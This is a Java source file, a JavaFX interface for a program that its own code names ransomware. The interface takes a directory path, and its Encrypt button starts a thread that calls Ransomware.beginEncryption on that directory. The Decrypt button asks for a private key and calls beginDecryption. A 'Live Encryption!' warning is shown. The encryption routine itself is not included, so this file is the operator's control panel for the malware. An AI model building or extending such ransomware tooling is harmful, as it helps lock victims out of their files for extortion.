import javafx.application.Application;
import javafx.event.ActionEvent;
import javafx.event.EventHandler;
import javafx.geometry.Insets;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.TextField;
import javafx.scene.layout.BorderPane;
import javafx.scene.layout.VBox;
import javafx.scene.text.Text;
import javafx.stage.Stage;
import javafx.stage.WindowEvent;

/**
 * GUI for the encryption.
 */
public class GUI extends Application {
	private Button encrypt;
	private Button decrypt;
	private Button encryptMain;
	private Button decryptMain;
	private TextField encryptDirectory;
	private TextField decryptDirectory;
	private TextField privateKey;
	private Label encryptDirectoryLabel;
	private Label decryptDirectoryLabel;
	private Label privateKeyLabel;
	private Text warning;
	private Text warning2;

	/**
	 * Sets up the interface
	 */
	@Override
	public void start(Stage primaryStage) throws Exception {
		encrypt = new Button("Encrypt!");
		decrypt = new Button("Decrypt!");
		encryptMain = new Button("Encrypt!");
		decryptMain = new Button("Decrypt!");
		encryptDirectory = new TextField();
		decryptDirectory = new TextField();
		privateKey = new TextField();
		encryptDirectoryLabel = new Label("Directory:");
		decryptDirectoryLabel = new Label("Directory:");
		privateKeyLabel = new Label("Private Key:");
		warning = new Text("WARNING!");
		warning2 = new Text("Live Encryption!");

		encryptDirectory.setPrefWidth(400);
		decryptDirectory.setPrefWidth(400);
		privateKey.setPrefWidth(400);
		encryptDirectory.setMaxWidth(400);
		decryptDirectory.setMaxWidth(400);
		privateKey.setMaxWidth(400);

		// Main Scene
		BorderPane mainPane = new BorderPane();
		mainPane.setPadding(new Insets(70));
		VBox mainPaneCenter = new VBox();
		mainPaneCenter.setSpacing(10);
		mainPane.setCenter(mainPaneCenter);
		mainPaneCenter.getChildren().add(warning);
		mainPaneCenter.getChildren().add(warning2);
		mainPaneCenter.getChildren().add(encryptMain);
		mainPaneCenter.getChildren().add(decryptMain);
		Scene mainScene = new Scene(mainPane, 200, 250);
		primaryStage.setScene(mainScene);
		primaryStage.setTitle("Main");

		// Encrypt Scene
		BorderPane encryptPane = new BorderPane();
		encryptPane.setPadding(new Insets(70));
		VBox encryptPaneCenter = new VBox();
		encryptPaneCenter.setSpacing(10);
		encryptPane.setCenter(encryptPaneCenter);
		encryptPaneCenter.getChildren().add(encryptDirectoryLabel);
		encryptPaneCenter.getChildren().add(encryptDirectory);
		encryptPaneCenter.getChildren().add(encrypt);
		Scene encryptScene = new Scene(encryptPane, 400, 250);

		// Decrypt Scene
		BorderPane decryptPane = new BorderPane();
		decryptPane.setPadding(new Insets(70));
		VBox decryptPaneCenter = new VBox();
		decryptPaneCenter.setSpacing(10);
		decryptPane.setCenter(decryptPaneCenter);
		decryptPaneCenter.getChildren().add(decryptDirectoryLabel);
		decryptPaneCenter.getChildren().add(decryptDirectory);
		decryptPaneCenter.getChildren().add(privateKeyLabel);
		decryptPaneCenter.getChildren().add(privateKey);
		decryptPaneCenter.getChildren().add(decrypt);
		Scene decryptScene = new Scene(decryptPane, 400, 250);

		primaryStage.show();
		primaryStage.addEventHandler(WindowEvent.WINDOW_CLOSE_REQUEST, new EventHandler<WindowEvent>() {
			@Override
			public void handle(WindowEvent window) {
				System.exit(0);
			}
		});

		encrypt.setOnAction(new EventHandler<ActionEvent>() {

			@Override
			public void handle(ActionEvent event) {
				String directoryString = encryptDirectory.getText();
				new Thread() {
					@Override
					public void run() {
						(new Ransomware(directoryString)).beginEncryption();
					}
				}.start();
				primaryStage.close();
			}
		});

		decrypt.setOnAction(new EventHandler<ActionEvent>() {

			@Override
			public void handle(ActionEvent event) {
				String privateKeyString = privateKey.getText();
				String directoryString = decryptDirectory.getText();

				new Thread() {
					@Override
					public void run() {
						(new Ransomware(directoryString)).beginDecryption(privateKeyString);
					}
				}.start();
				primaryStage.close();
			}
		});
		encryptMain.setOnAction(new EventHandler<ActionEvent>() {

			@Override
			public void handle(ActionEvent event) {
				primaryStage.setScene(encryptScene);
				primaryStage.setTitle("Encrypt");
			}
		});

		decryptMain.setOnAction(new EventHandler<ActionEvent>() {

			@Override
			public void handle(ActionEvent arg0) {
				primaryStage.setScene(decryptScene);
				primaryStage.setTitle("Decrypt");

			}

		});
	}

}
